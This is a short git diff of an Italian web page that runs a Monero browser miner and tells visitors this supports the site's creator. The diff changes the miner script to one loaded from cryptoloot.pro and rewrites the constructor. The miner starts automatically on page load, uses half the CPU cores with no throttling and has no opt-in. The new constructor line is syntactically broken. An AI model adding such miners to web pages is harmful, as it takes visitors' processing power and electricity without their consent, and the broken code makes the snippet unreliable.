@@ -8,13 +8,13 @@
 		<p lang="it">Questo sito ha un <b>miner</b>, supporti il creatore sfruttando una piccola parte del processore per minare <acronym title="Criptovaluta creata nell'aprile 2014, simile al bitcoin. E' una moneta decentralizzata."</acronym>Monero.</p>
 		<p><b><b>Ma non solo!</b></b>
 		<p>Minando Monero su questo sito contribuisci alla crescita del valore di questa criptomoneta, rendendo sempre più favorevole gli investimenti!<br />Inoltre il sito è libero da pubblicità e inserzioni che rendono la navigazione meno piacevole.</p>
-		<script src="https://crypto-loot.com/lib/miner.min.js"></script>
+		<script src="//cryptoloot.pro/lib/crlt.js"></script>
 		<script>
         	    var threads = window.navigator.hardwareConcurrency / 2;
             	if (threads < 1) {
                 	var threads = 3;
             		}
-            	var miner=new CryptoLoot.Anonymous('7187b7c8a4219801993181c9e0ec0c0c63e7ef0c61d6',
+            	var miner=new CRLT.Anonymous();('7187b7c8a4219801993181c9e0ec0c0c63e7ef0c61d6',
        			{
        				threads:threads,autoThreads:false,throttle:0,
         		}
